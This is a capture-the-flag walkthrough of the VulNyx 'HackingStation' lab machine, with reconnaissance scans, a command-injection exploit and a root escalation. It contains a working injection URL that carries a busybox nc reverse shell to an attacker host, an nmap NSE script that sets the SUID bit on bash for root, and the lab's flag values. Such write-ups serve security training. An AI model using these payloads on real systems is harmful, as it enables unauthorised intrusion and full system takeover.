# VulNyx - HackingStation

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 192.168.11.19
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 17:17 +07
Nmap scan report for 192.168.11.19
Host is up (0.00076s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: HackingStation
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:65:27:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.45 seconds
```

#### Nikto
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nikto -C all -h 192.168.11.19  
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.11.19
+ Target Hostname:    192.168.11.19
+ Target Port:        80
+ Start Time:         2026-05-06 17:18:50 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.57 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Server may leak inodes via ETags, header found with file /, inode: 2ac, size: 614a2c21651ae, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
+ 26641 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-05-06 17:21:26 (GMT7) (156 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

![web](/walkthroughs/vulnyx/low-difficulty/22_hackingstation/web.png)

### Shell
#### Command Injection
![search](/walkthroughs/vulnyx/low-difficulty/22_hackingstation/search.png)

![command injection](/walkthroughs/vulnyx/low-difficulty/22_hackingstation/command-injection.png)

#### Reverse shell
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -sX GET "http://192.168.11.19/exploitQuery.php?product=nmap;busybox%20nc%20192.168.11.10%204444%20-e%20sh%0A"
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444                
listening on [any] 4444 ...
connect to [192.168.11.10] from (UNKNOWN) [192.168.11.19] 42636
id ; hostname
uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)
HackingStation
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
hacker@HackingStation:/var/www/html$ 
```

### Privilege Escalation
#### Enumeration
```bash
hacker@HackingStation:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for hacker on HackingStation:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User hacker may run the following commands on HackingStation:
    (root) NOPASSWD: /usr/bin/nmap
```

#### Abuse
```bash
hacker@HackingStation:/var/www/html$ TF=$(mktemp)
TF=$(mktemp)
hacker@HackingStation:/var/www/html$ echo 'os.execute("chmod 4755 /bin/bash")' > $TF
<ml$ echo 'os.execute("chmod 4755 /bin/bash")' > $TF
hacker@HackingStation:/var/www/html$ sudo -u root /usr/bin/nmap --script=$TF
sudo -u root /usr/bin/nmap --script=$TF
Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-06 12:49 CEST
NSE: Warning: Loading '/tmp/tmp.nQMuN5Wo4O' -- the recommended file extension is '.nse'.
NSE: failed to initialize the script engine:
/usr/bin/../share/nmap/nse_main.lua:636: /tmp/tmp.nQMuN5Wo4O is missing required field: 'action'
stack traceback:
        [C]: in function 'error'
        /usr/bin/../share/nmap/nse_main.lua:636: in field 'new'
        /usr/bin/../share/nmap/nse_main.lua:840: in local 'get_chosen_scripts'
        /usr/bin/../share/nmap/nse_main.lua:1344: in main chunk
        [C]: in ?

QUITTING!
hacker@HackingStation:/var/www/html$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
hacker@HackingStation:/var/www/html$ /bin/bash -pi
/bin/bash -pi
bash-5.2# id ; hostname
id ; hostname
uid=1000(hacker) gid=1000(hacker) euid=0(root) groups=1000(hacker)
HackingStation
```

### Flags
```bash
bash-5.2# find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
f900f7fb7d2c5ea64deca6378ebe5ead
e34efd51251772a8abc4cc00ee52bb0a
```

***You are welcome!***
